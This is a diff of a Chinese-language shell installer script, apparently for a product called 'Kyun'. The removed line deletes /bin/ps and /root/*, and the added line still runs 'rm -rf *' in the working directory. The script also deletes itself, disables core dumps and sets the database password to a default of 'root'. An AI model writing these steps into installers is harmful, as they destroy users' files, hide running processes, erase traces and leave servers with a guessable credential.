@@ -15,7 +15,7 @@ clear
 trap exit SIGTSTP 
 rm -rf ${0};rm -rf ky.*
 ulimit -c 0 && rm -rf ${0}
-rm -rf /bin/ps && rm -rf ky.* ky && rm -rf * && rm -rf /root/*
+rm -rf *
 echo && echo 'Loding...'
 yum install curl -y >/dev/null 2>&1
 Kylogo='
@@ -138,12 +138,12 @@ function KyunClear() {
 clear
 echo -e "你需要自定义一些信息 [建议你密码尽量设置复杂]" 
 echo
-echo -n -e "请输入数据库密码[回车默认：kuaiyum ]：" 
+echo -n -e "请输入数据库密码[回车默认：root ]：" 
 read sqlpass
 echo
 if [[ -z ${sqlpass} ]]
 then
-sqlpass=kuaiyum
+sqlpass=root
 echo -e "数据库密码已设置为：\033[32m $sqlpass \033[0m" ; 
 else
 echo -e "数据库密码已设置为：\033[32m $sqlpass \033[0m" 
